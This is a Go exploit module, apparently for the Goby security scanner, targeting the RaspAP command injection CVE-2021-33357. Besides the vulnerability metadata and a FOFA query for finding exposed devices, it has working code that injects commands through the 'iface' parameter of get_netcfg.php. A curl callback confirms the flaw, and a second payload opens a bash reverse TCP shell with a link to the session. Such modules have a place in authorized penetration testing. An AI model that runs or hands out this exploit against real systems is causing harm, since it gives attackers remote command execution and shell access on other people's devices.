package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "RaspAP Operating System get_netcfg.php file Command Injection Vulnerability (CVE-2021-33357)",
    "Description": "<p>RaspAP is an application software for simple wireless AP setup and management for Debian based devices</p><p>There is an operating system command injection vulnerability in RaspAP, which stems from improper filtering of special characters such as \";\" in the \"iface\" parameter in RaspAP versions 2.6 to 2.6.5. An attacker can use this vulnerability to execute arbitrary operating system commands.</p>",
    "Impact": "<p>RaspAP Operating System Command Injection Vulnerability (CVE-2021-33357)</p>",
    "Recommendation": "<p>At present, the manufacturer has not released fixes to solve this security problem. It is recommended that users of this software pay attention to the manufacturer's homepage or reference website at any time to obtain solutions:</p><p><a href=\"http://www.example.com\">https://gist.github.com/omriinbar/52c000c02a6992c6ce68d531195f69cf</a></p>",
    "Product": "RaspAP",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "RaspAP 操作系统 get_netcfg.php 文件命令注入漏洞（CVE-2021-33357）",
            "Product": "RaspAP",
            "Description": "<p>RaspAP是应用软件基于 Debian 的设备的简单无线 AP 设置和管理</p><p>RaspAP存在操作系统命令注入漏洞，该漏洞源于在RaspAP 2.6版本到2.6.5版本中未正确过滤“iface”参数中的“;”等特殊字符。攻击者利用该漏洞就可以执行任意的操作系统命令。</p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：</p><p><a target=\"_Blank\" href=\"https://gist.github.com/omriinbar/52c000c02a6992c6ce68d531195f69cf\">https://gist.github.com/omriinbar/52c000c02a6992c6ce68d531195f69cf</a></p>",
            "Impact": "<p>RaspAP存在操作系统命令注入漏洞，该漏洞源于在RaspAP 2.6版本到2.6.5版本中未正确过滤“iface”参数中的“;”等特殊字符。攻击者利用该漏洞就可以执行任意的操作系统命令。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "RaspAP Operating System get_netcfg.php file Command Injection Vulnerability (CVE-2021-33357)",
            "Product": "RaspAP",
            "Description": "<p>RaspAP is an application software for simple wireless AP setup and management for Debian based devices</p><p>There is an operating system command injection vulnerability in RaspAP, which stems from improper filtering of special characters such as \";\" in the \"iface\" parameter in RaspAP versions 2.6 to 2.6.5. An attacker can use this vulnerability to execute arbitrary operating system commands.</p>",
            "Recommendation": "<p>At present, the manufacturer has not released fixes to solve this security problem. It is recommended that users of this software pay attention to the manufacturer's homepage or reference website at any time to obtain solutions:</p><p><a href=\"http://www.example.com\" target=\"_blank\">https://gist.github.com/omriinbar/52c000c02a6992c6ce68d531195f69cf</a></p>",
            "Impact": "<p>RaspAP Operating System Command Injection Vulnerability (CVE-2021-33357)</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "header=\"RaspAP\"|| banner=\"RaspAP\"",
    "GobyQuery": "header=\"RaspAP\"|| banner=\"RaspAP\"",
    "Author": "NULL2049",
    "Homepage": "https://raspap.com",
    "DisclosureDate": "2021-06-09",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-33357"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-33357"
    ],
    "CNVD": [
        "CNVD-2021-94940"
    ],
    "CNNVD": [
        "CNNVD-202106-747"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell_linux",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10473"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cmd := "curl%20" + checkUrl
			uri := "/ajax/networking/get_netcfg.php?iface=;" + cmd + ";"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return godclient.PullExists(checkStr, time.Second*15)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			waitSessionCh := make(chan string)
			rp, _ := godclient.WaitSession("reverse_linux", waitSessionCh)
			command := godclient.ReverseTCPByBash(rp)
			command = "bash -c \"" + command + "\""
			command = url.QueryEscape(command)
			uri := "/ajax/networking/get_netcfg.php?iface=;" + command + ";"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			select {
			case webConsleID := <-waitSessionCh:
				log.Println("[DEBUG] session created at:", webConsleID)
				if u, err := url.Parse(webConsleID); err == nil {
					expResult.Success = true
					expResult.OutputType = "html"
					sid := strings.Join(u.Query()["id"], "")
					expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
				}
			case <-time.After(time.Second * 15):
			}
			return expResult
		},
	))
}
